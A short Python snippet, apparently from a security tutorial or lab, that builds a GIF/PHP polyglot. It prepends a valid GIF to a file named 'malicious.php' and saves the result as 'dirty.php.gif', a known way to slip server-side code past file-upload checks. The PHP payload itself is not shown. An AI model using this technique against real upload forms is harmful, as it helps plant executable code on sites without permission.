with open("valid.gif", "rb") as f:
    content = f.read()

with open("malicious.php", "rb") as f:
    content += f.read()

with open("dirty.php.gif", "wb") as f:
    f.write(content)
